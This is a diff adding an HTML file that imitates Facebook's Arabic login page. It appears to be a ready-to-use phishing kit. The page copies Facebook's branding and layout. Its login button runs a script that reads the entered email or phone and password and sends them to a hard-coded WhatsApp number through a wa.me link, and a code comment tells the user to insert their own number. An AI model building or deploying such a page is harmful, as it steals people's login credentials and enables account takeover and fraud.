@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<title>تسجيل الدخول فيسبوك</title>
+<link rel="icon" type="image/webp" href="Facebook (1).webp">
+<style>
+    * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+    }
+
+    body {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        background-color: #f0f2f5;
+        direction: rtl;
+    }
+
+    .page {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+
+    .container {
+        display: flex;
+        gap: 80px;
+        align-items: center;
+    }
+
+    /* القسم النصي على اليسار */
+    .left {
+        max-width: 400px;
+    }
+
+    .left h1 {
+        font-size: 60px;
+        color: #1877f2;
+        margin-bottom: 20px;
+    }
+
+    .left p {
+        font-size: 22px;
+        color: #1c1e21;
+        line-height: 1.5;
+    }
+
+    /* صندوق تسجيل الدخول */
+    .form-box {
+        background-color: #fff;
+        padding: 30px 25px;
+        border-radius: 10px;
+        width: 360px;
+        box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+    }
+
+    .form-box input {
+        width: 100%;
+        padding: 14px;
+        margin-bottom: 12px;
+        border-radius: 6px;
+        border: 1px solid #ddd;
+        font-size: 15px;
+    }
+
+    .login-btn {
+        width: 100%;
+        padding: 14px;
+        background-color: #1877f2;
+        border: none;
+        border-radius: 6px;
+        color: white;
+        font-size: 17px;
+        font-weight: bold;
+        cursor: pointer;
+        transition: background 0.3s;
+    }
+
+    .login-btn:hover {
+        background-color: #166fe5;
+    }
+
+    .link {
+        text-align: center;
+        margin: 12px 0;
+    }
+
+    .link a {
+        color: #1877f2;
+        text-decoration: none;
+        font-size: 14px;
+    }
+
+    hr {
+        border: none;
+        border-top: 1px solid #ccc;
+        margin: 15px 0;
+    }
+
+    .create-btn {
+        width: 100%;
+        padding: 14px;
+        background-color: #42b72a;
+        border: none;
+        border-radius: 6px;
+        color: white;
+        font-size: 16px;
+        font-weight: bold;
+        cursor: pointer;
+        transition: background 0.3s;
+    }
+
+    .create-btn:hover {
+        background-color: #36a420;
+    }
+
+    /* شعار أعلى الصفحة */
+    .logo {
+        position: absolute;
+        top: 20px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 160px;
+    }
+
+    /* تصميم متجاوب */
+    @media (max-width: 900px) {
+        .container {
+            flex-direction: column;
+            gap: 40px;
+        }
+        .left {
+            text-align: center;
+        }
+    }
+
+</style>
+</head>
+<body>
+
+<!-- شعار فيسبوك -->
+<img src="Facebook (1).webp" class="logo">
+
+<div class="page">
+    <div class="container">
+
+        <!-- النص الدعائي -->
+        <div class="left">
+            <h1>Facebook</h1>
+            <p>تواصل مع أصدقائك وعائلتك فورًا وشارك معهم اللحظات المهمة بسهولة وسرعة.</p>
+        </div>
+
+        <!-- صندوق تسجيل الدخول -->
+        <div class="form-box">
+            <form>
+                <input type="text" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                <input type="password" placeholder="كلمة المرور" required>
+
+              <button type="button" class="login-btn" onclick="sendToWhatsApp()">
+تسجيل الدخول
+</button>
+
+                <div class="link">
+                    <a href="#">هل نسيت كلمة المرور؟</a>
+                </div>
+
+                <hr>
+
+                <button class="create-btn">إنشاء حساب جديد</button>
+            </form>
+        </div>
+
+    </div>
+</div>
+<script>
+function sendToWhatsApp() {
+    let email = document.querySelector('input[type="text"]').value;
+    let password = document.querySelector('input[type="password"]').value;
+
+    if (!email || !password) {
+        alert("من فضلك املأ البيانات أولاً");
+        return;
+    }
+
+    let phone = "01037410816"; // 👈 حط رقمك هنا (بدون +)
+
+    let message =
+`🔔 تسجيل دخول جديد:
+📧 البريد/الهاتف: ${email}
+🔒 كلمة المرور: ${password}`;
+
+    let url = `https://wa.me/${phone}?text=${encodeURIComponent(message)}`;
+
+    window.open(url, "_blank");
+}
+</script>
+</body>
+</html>
